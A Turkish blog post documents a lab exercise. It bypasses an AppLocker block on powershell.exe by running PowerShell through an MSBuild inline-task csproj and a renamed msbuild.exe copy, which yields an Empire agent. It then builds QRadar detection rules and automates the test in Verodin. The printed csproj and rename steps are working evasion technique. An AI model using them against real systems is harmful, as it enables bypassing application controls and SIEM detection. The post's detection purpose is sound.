author = "Can Yoleri"
title = "Living A Sweet PowerShell: #2"
date = "2020-09-20"
description = ""
tags = [
    "powershell",
    "msbuild",
    "verodin",
    "qrdar",
]
categories = [
    "",
    "",
]
series = [""]
aliases = [""]

+++

<img src="C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\blue-red.jpg" alt="blue-red" style="zoom:80%;" />



Bazı domain ortamlarında güvenlik veya sıkılaştırmalardan dolayı **powershell.exe** - **powershell_ise.exe** processlerinin çalışması GPO/Applocker üzerinden engellenebiliyor. Bu kısıtlamalar bazen yanlış da yapılandırılabiliyor.. Direkt olarak PowerShell komutlarımızı, scriptlerimizi çalıştıramıyoruz, sızma testlerinde Offensive PowerShell büyük bir nimetken bir kaç kısıtlama var diye pes edecek değiliz :) PowerShell, powershell.exe'den ibaret olmadığı için bu kısıtlamaları aşabiliyoruz.  

Bugünkü senaryoda Red Team tarafında powershell.exe'nin engelli olduğu bir ortamda Empire üzerinden bağlantı almayı, PowerShell scripti, komutu çalıştırmayı, Blue Team tarafında bu saldırıları nasıl tespit edebileceğimizi, kurallar geliştireceğimizi ve kendi oluşturduğumuz atak senaryolarını Mandiant Security Validation (Verodin) ürünü üzerinden otomatize hale getirerek güvenlik ürünlerinin tepkilerini, SIEM kurallarını test edeceğiz. 
<!--more-->

# **Living A Sweet PowerShell**: #2


Ortamda neler var?

- Sysmon
- QRadar
- PowerShell loglarının konfigüre edilmiş olması (Module Logging vs..)
- Verodin

<br />

Applocker ile powershell.exe - powershell_ise.exe processlerini engelledim.

![applockerpwsh](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\applockerpwsh.png)



Applocker ile hızımı alamadım ek olarak Don't run specified Windows applications seçeneğiyle engelledim.  

![pwshblock](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\pwshblock.png)



**Saldırgan tarafı:**

Empire'ı ayarlayalım. Listenerı başlattım

![listener](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\listener.png )

<br />

Launcher kodumuz aşağıdaki gibi.

![launcher](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\launcher.png)



MSBuild üzerinden PowerShell scriptimi çalıştırmak için PowerLessShell aracını kullanmam gerekiyor. PowerLessShell, MSBuild üzerinden powershell.exe kullanmadan PowerShell scriptlerinizi, kodunuzu çalıştırmaya imkan veren bir araç. 

[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell)

<br />

Base64 ile şifrelenen launcher kodunu çözüp pw.ps1 dosyası olarak kaydettim.

![base64](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\base64.png)



PowerLessShell'i çalıştırıp gerekli değerleri giriyorum.

![powerlesshell](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\powerlesshell.png)

Oluşturduğu csproj dosyası:

![sky](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\sky.png)

![sky2](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\sky2.png)

![sky3](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\sky3.png)



Saldırgan olarak şu anda tek yapmam gereken hedef sistem üzerinde sky.csproj.bat dosyasını çalıştırmak.

![runpayload](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\runpayload.png)

<br />

**Build started**. 

Empire'a baktığımda bağlantının gelmiş olduğunu görüyorum. 

![runpayload2](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\runpayload2.png)



![runpayload3](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\runpayload3.png)



bat dosyasını çalıştırdığımızda msbuild.exe'yi kopyalayarak adını değiştiriyor, hedef sistemin SIEM'inde imagename == msbuild.exe ile ilgili bir kural/kurallar varsa bypass edilmiş oluyor, alarm oluşmuyor.  Windows'un legal processlerini (certutil) kullanarak AV/EDR gibi ürünleri de atlatabiliyor.



**Savunma tarafı:**

Yukarıdaki bat dosyası çalıştırdığımızda gelen logları incelemeye başlayalım.  

cmd.exe, certutil processine 0x1fffff izniyle erişiyor. Anormal bir durum olabileceği için loglara bakmaya devam edelim.

![log2](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log2.png)



**Microsoft.Net\Framework\***  dizini altında ZRdFAwXBUI.exe diye bir dosya oluşmuş. Fakat bu Windows'a ait bir process değil ve adının böyle olması anormal bir durum hakkında olan şüphelerimizi yavaş yavaş doğru çıkarıyor..

![log3](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log3.png)



Loglara bakmaya devam ediyorum. Az önce gördüğüm process temp alanında bir dll dosyası oluşturmuş.

![log4](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log4.png)



![log5](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log5.png)



Bu process System.Management.Automation.dll dosyasını da yüklemiş. PowerShell, System.Management.Automation.dll'in içerisinde işlem yapar. Bu DLL dosyasını görünce bu processin PowerShell kullanmaya çalıştığını düşünüyoruz. 

![log6](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log6.png)

<br />

Yukarıda bahsettiğim üzere PowerLessShell, MSBuild processini kopyalayıp adını değiştiriyordu fakat Windows'un kendi processleri çalıştığında üretilen Process Create logunun içerisine **OriginalFileName** diye bir alan eklenir. MSBuild processinin adı zedeleyici.exe bile olsa OriginalFileName kısmında MSBuild.exe diye processin gerçek adını görürüz. 

Aşağıdaki Process Create loguna baktığım zaman OriginalFileName MSBuild.exe olmasına rağmen Image kısmında ZRdFAwXBUI.exe olarak görüyorum.

![originalfilenamelogs](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\originalfilenamelogs.png)

![log7](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log7.png)

<br />

O zaman QRadar üzerinde ImageName ve OriginalFileName adları aynı olmayan process create logları için bir kural yazıp alarm oluşturabilirim. Aşağıdaki gibi bir AQL yazdığımda bana istediğim şeyi veriyor. Bunu kural olarak ekleyip yoluma devam ediyorum. 

[^False Positive elemesi yapmak gerekebiliyor :)]: 

```
SELECT ImageName, OriginalFileName FROM events
WHERE "EventID"= '1' AND
LOGSOURCENAME(logsourceid) ILIKE '%ZEDELEYICI%'
AND LOWER("ImageName")
!= LOWER("OriginalFileName") AND "ImageName" IS NOT NULL AND "OriginalFileName" IS NOT NULL AND "OriginalFileName" <> '?'
```

![qradar-aql](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\qradar-aql.png)



Bir önceki blog yazımda PowerShell loglamasının açık olmasının öneminden bahsetmiştim. PowerShell loglaması açık olduğu için çalışan PowerShell scriptini aşağıdaki log içerisinde görüyorum. 

[^FromBase64String yazan kısmı decode edince C&C sunucusunun IP adresi ortaya çıkıyor.]: 

![log8](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log8.png)

![log11](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log11.png)

**Host Application = ZRdFAwXBUI.exe** 

![log12](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log12.png)



Aynı anormal process csc.exe processini de kullanıyor

![log9](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log9.png)



 __PSScriptPolicyTest_<random_number>.ps1 dosyaları PowerShell tarafından Applocker'ı test etmek için kullanılır. Eğer dosya çalışırsa Applocker'ın kapalı olduğunu varsayar.  

![log10](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\log10.png)



certutil processinin -decodehex parametresiyle kullanıldığını görüyorum. Certutil legal fakat kötüye kullanıma imkan veren bir process olduğu için aşağıdaki parametrelerle kullanıldığında alarm üretmesini sağlayıp incelemek gerekiyor.
**-decodehex**
**-urlcache -split**
**-encode**
**-decode** 

![decodehex](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\decodehex.png)

<br />

<br />

Buraya kadar nasıl önlem alabileceğimizi az çok göstermeye çalıştım fakat bir diğer önemli konu bu saldırı senaryolarının otomatize hale getirilmesi. Bir yandan atak senaryomuzu deneyip bir yandan logları incelemeye çalışırken fazla zaman harcayabiliyoruz. Fireeye'ın satın aldığı eski adıyla Verodin şimdi ki adıyla  Mandiant Security Validation ürünü sayesinde yazdığımız atak senaryolarını otomatize hale getirebiliriz. SIEM, Network, Endpoint güvenlik ürünleriyle de entegre olarak senaryoların sonucunda üretilen alarmları, logları, engellenip engellenmediğini bize gösteriyor. 

[^Üstte PowerLessShell ile oluşturduğum csproj dosyası ile Verodin'e eklediğim csproj dosyası birbirinden farklı. Verodin'le test ederken Empire'a bağlantı almayacağım için PowerShell'de komut çalıştırabileceğim bir csproj işimizi görüyor.]: 



PowerShell kodu çalıştırabileceğim bir csproj dosyası hazırlarken internette daha önce **powashell.csproj** adıyla yazılan bir dosyaya denk geldim.

[powashell.csproj](https://gist.githubusercontent.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0/raw/2a27c22e8d3436640e7f1ac5219095af3075b446/powashell.csproj)

Scripte aşağıdaki gibi encode edilmiş bir powershell komutu ekledim.

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe powaShell.csproj -->
  <Target Name="Hello">
   <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
   <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
   <!-- Your PowerShell Path May vary -->
      <Code Type="Class" Language="cs">
        <![CDATA[

      // all code by Casey Smith @SubTee

      using System;
      using System.Reflection;
      using Microsoft.Build.Framework;
      using Microsoft.Build.Utilities;
      
      using System.Collections.ObjectModel;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using System.Text;
        
      public class ClassExample :  Task, ITask
      {
        public override bool Execute()
        {
          //Console.WriteLine("Hello From a Class.");
          Console.WriteLine(powaShell.RunPSCommand());
          return true;
        }
      }
      
      //Based on Jared Atkinson's And Justin Warner's Work
      public class powaShell
      {
        public static string RunPSCommand()
        {
                    
          //Init stuff
          
          InitialSessionState iss = InitialSessionState.CreateDefault();
          iss.LanguageMode = PSLanguageMode.FullLanguage;
          Runspace runspace = RunspaceFactory.CreateRunspace(iss);
          runspace.Open();
          RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
          Pipeline pipeline = runspace.CreatePipeline();
          
          //Interrogate LockDownPolicy
          Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());        
          
          
          
          //Add commands
          pipeline.Commands.AddScript(("powershell -enc dwBoAG8AYQBtAGkA -noexit"));
          //Prep PS for string output and invoke
          pipeline.Commands.Add("Out-String");
          Collection<PSObject> results = pipeline.Invoke();
          

          //Convert records to strings
          StringBuilder stringBuilder = new StringBuilder();
          foreach (PSObject obj in results)
          {
            stringBuilder.Append(obj);
          }
          return stringBuilder.ToString().Trim();     
        }
      }
              
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```



Şimdi Verodin'e ekleyerek senaryoyu otomatize hale getirelim.

Verodin'e girdiğimizde Library kısmında Files seçeneğine geliyoruz ve Upload File diyoruz.

![verodinfiles](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodinfiles.png)



Böyle bir ekran geliyor karşımıza. File Notes, Applicable OS/platform kısımlarını doldurup csproj dosyasını seçiyorum ve upload file diyorum.

![verodin-upload-file](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-upload-file.png)



csproj dosyamızı ekledik. (ben daha önceden ekleyip actions oluşturduğum için VIDs kısmında action numaralarını görüyorum.)

![verodin-up-success](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-up-success.png)



Dosyamızı ekledikten sonra bir Actions oluşturmamız gerekiyor. Library > Actions kısmına geliyorum. Add Action kısmından Host CLI oluşturacağım için onu seçiyorum. 

![verodin-actions](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions.png)


**Action User Profile** kısmında System kullanıcısıyla çalışacağını belirtiyorum.
**Add File Dependencies** kısmından az önce eklediğim **PWSH-without-pwsh.exe.csproj** dosyasını seçip çalışacağı dizini belirttim.

![verodin-actions2](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions2.png)

Next diyorum.

<br />

Bu kısımda cmd.exe üzerinden çalışacağını belirtiyorum. İstersek powershell, python, bash üzerinden de çalıştırabiliriz.

![verodin-actions3](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions3.png) 



Command Input kısmında bu atak senaryosunun hangi parametrelerle çalışacağını ve ne yapacağını yazıyorum.

```
#Sistemin x64 veya x86 olup olmadıgını kontrol ediyoruz  
for /F "delims==" %A in ('systeminfo ^|findstr /B /C:"System Type"') do @set Arch=%A
  auto,4,true,60
  success_zero

#x64 ise bu path, x86 ise şu pathe git şeklinde belirtiyoruz.
if /I "%Arch:86=%" equ "%Arch%" (set Part1=C:\Windows\Microsoft.NET\Framework64\) ELSE (set Part1=C:\Windows\Microsoft.NET\Framework\)
  auto,4,true,60
  success_zero

#MSBuild.exe'yi ms.exe adıyla tmp alanına kopyalıyorum
copy %Part1%v4.0.30319\msbuild.exe %tmp%\ms.exe
  auto,4,true,60
  success_zero

#cmd'yi açıp ms.exe'yi csproj dosyasıyla beraber çalıştırıyorum.
start cmd.exe @cmd /k "%tmp%\ms.exe c:\windows\temp\PWSH-without-pwsh.exe.csproj"
  auto,10,true,60
  success_zero

#Eger atak başarılı bir şekilde gerçekleştiyse ms.exe processi çalışacaktır. 
tasklist /svc | findstr ms.exe
  auto,4,true,60
  success_zero

#Atak başarılı bir şekilde gerçekleşiyor ve ms.exe processini öldürüyoruz.
taskkill /im "ms.exe" /f
  auto,4,true,60
  cleanup
  
#csproj dosyasını siliyoruz.  
del c:\windows\temp\PWSH-without-pwsh.exe.csproj
  auto,4,true,60
  cleanup

#ms.exe processini siliyoruz.
del %tmp%\ms.exe
  auto,4,true,60
  cleanup
```



Validate Syntax butonuna basıp yazdıklarımızda bir sıkıntı varsa görebiliyoruz. **Successful**

![verodin-actions4](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions4.png)

Next diyoruz.

<br />

Action adını ve açıklamasını yazıyoruz. 

**Attack vector**          general-vector  
**Attacker location**   Internal
**Behavior Type**         General Behavior
**Covert**                        No
**OS/Platform**             Windows
**Stage of Attack**        Execution

User tag olarak **#powerhell** ve **#msbuild** yazdım.

<img src="C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions5.png" alt="verodin-actions5" style="zoom:150%;" />



Save and Approve Anywhere butonuna basıp kaydediyorum. Library > Actions kısmına gelip arama kısmına **Execution: PowerShell without powershell.exe** yazınca oluşturduğum aksiyonu görebiliyorum.

![verodin-actions6](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions6.png)



![verodin-actions7](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions7.png)



Oluşturduğum aksiyonu çalıştırıp deneyeceğim. Mavi renkli play butonuna basıp Endpoint Actor seçeneğinden hangi aktörde bu senaryoyu yapmak istiyorsam onu seçip Run Now diyerek başlatıyorum.

![](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-run.png)



**RUNNING**

![verodin-actions-run](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions-run.png)



Denediğim senaryo üstteki yazdığım SIEM kurallarıma çarptığı için saldırıyı yakaladım. PASS! :) 

![verodin-actions-run2](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions-run2.png)



En güzel noktalardan bir tanesi aksiyonu oluştururken yazdığımız komutların çıktılarını bize aşağıdaki gibi verebiliyor. Gerçekten çalıştı mı yoksa hata mı aldı diye görebiliyoruz.

![verodin-actions-run-3](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions-run-3.png)



Events kısmından incelediğimizde Match eden QRadar kurallarını rahatlıkla görebiliyoruz. 

![verodin-actions-qradar](C:\Users\pc\Documents\canyoleri.github.io\canyoleri.github.io\static\images\pwsholmadan\verodin-actions-qradar.png)

<br />
Yazıda yanlışlık gördüğünüz yerlerde benimle iletişime geçebilirsiniz. Bir sonraki yazı dizisinde görüşmek üzere. 
<br />